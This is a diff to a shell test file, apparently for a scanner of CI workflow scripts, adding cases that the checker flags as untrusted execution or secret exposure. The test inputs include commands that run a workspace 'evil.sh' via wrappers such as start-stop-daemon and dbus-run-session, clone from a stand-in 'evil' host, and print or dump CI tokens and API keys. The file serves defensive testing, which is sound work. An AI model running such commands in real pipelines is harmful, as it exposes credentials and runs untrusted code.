@@ -37,6 +37,7 @@ t wrapper-setarch 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefai
 t wrapper-linux32 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}linux32 bash \"\${GITHUB_WORKSPACE}/evil.sh\""
 t wrapper-dbus 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}dbus-run-session -- bash \"\${GITHUB_WORKSPACE}/evil.sh\""
 t wrapper-dbus-launch 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}dbus-launch --exit-with-session bash \"\${GITHUB_WORKSPACE}/evil.sh\""
+t wrapper-ssd 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}/usr/sbin/start-stop-daemon --start --name museevil --startas /bin/bash -- \"\${GITHUB_WORKSPACE}/evil.sh\""
 
 # --- git allowlist (subcommands fetch/diff/show/merge-base; -c quotePath) ---
 t git-clone-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git clone https://evil/x"
@@ -94,6 +95,10 @@ t stage-token 1 "helper-secret-expand" happy.sarif "$PR${FS}} > \"\${prompt_file
 t stage-token-group 1 "helper-secret-expand" happy.sarif "$PR${FS}} > \"\${prompt_file}\"${FS}b${FS}  echo \"token: \${GH_TOKEN}\""
 t stage-bareword-fp 0 "" happy.sarif "$PR${FS}} > \"\${prompt_file}\"${FS}a${FS}echo GH_TOKEN >> \"\${prompt_file}\""
 t stage-substr 1 "helper-secret-expand" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \"\${GITHUB_TOKEN:0:4}\" >> /tmp/x"
+# --- secret union (Codex P1: META_API_KEY, runtime tokens) ---
+t secret-meta 1 "helper-secret-expand" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf %s \"\$META_API_KEY\" | rev"
+t secret-runtime 1 "helper-secret-expand" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf %s \"\$ACTIONS_RUNTIME_TOKEN\" | rev"
+t secret-idtoken 1 "helper-secret-expand" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf %s \"\$ACTIONS_ID_TOKEN_REQUEST_TOKEN\" | rev"
 t stage-suffix-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \"\${GH_TOKEN_SUFFIX:-none}\""
 t stage-printenv 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printenv GH_TOKEN"
 t stage-envdump 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}env > /tmp/x"
